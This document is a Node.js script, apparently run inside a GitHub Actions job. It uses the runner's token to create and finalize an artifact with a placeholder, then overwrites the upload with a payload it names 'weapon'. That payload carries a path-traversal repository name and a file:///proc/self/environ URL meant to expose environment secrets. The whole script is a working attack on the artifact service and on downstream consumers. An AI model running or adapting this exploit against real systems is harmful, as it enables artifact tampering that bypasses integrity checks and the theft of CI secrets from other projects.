const crypto = require('crypto');
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const scp = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8')).scp;
  const parts = scp.split(' ').find(s => s.startsWith('Actions.Results:')).split(':');
  const runId = parts[1], jobId = parts[2];
  const mime = process.env.MIME || 'application/octet-stream';
  const name = 'glm1w-' + Date.now() + '.json';
  const cr = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, mime_type: mime, version: 7 })
  });
  const cj = await cr.json().catch(() => ({}));
  const sas = cj.signedUploadUrl || cj.signed_upload_url;
  if (!sas) { console.log('create', cr.status, JSON.stringify(cj).slice(0,140)); process.exit(2); }
  const placeholder = Buffer.from('{"full_name":"PLACEHOLDER"}');
  let pr = await fetch(sas, { method: 'PUT', headers: { 'Content-Type': mime, 'x-ms-blob-type': 'BlockBlob' }, body: placeholder });
  console.log('PUT1', pr.status);
  const fr = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, size: String(placeholder.length), hash: 'sha256:' + crypto.createHash('sha256').update(placeholder).digest('hex') })
  });
  const fj = await fr.json().catch(() => ({}));
  const id = fj.artifact_id || fj.artifactId;
  console.log('FIN1', fr.status, 'id', id);
  if (!id) process.exit(3);
  await new Promise(r => setTimeout(r, 1500));
  const weapon = Buffer.from(JSON.stringify({ full_name: 'a/../../repos/lemonsour864/cassette/actions/artifacts/' + id + '/zip', owner: { login: 'u', avatar_url: 'file:///proc/self/environ' } }));
  pr = await fetch(sas, { method: 'PUT', headers: { 'Content-Type': mime, 'x-ms-blob-type': 'BlockBlob' }, body: weapon });
  console.log('REPUT', pr.status, 'weaponLen', weapon.length);
  console.log('ARTIFACT_ID=' + id);
  console.log('WEAPON_SHA=' + crypto.createHash('sha256').update(weapon).digest('hex'));
})().catch(e => { console.log('ERR', e.message); process.exit(1); });
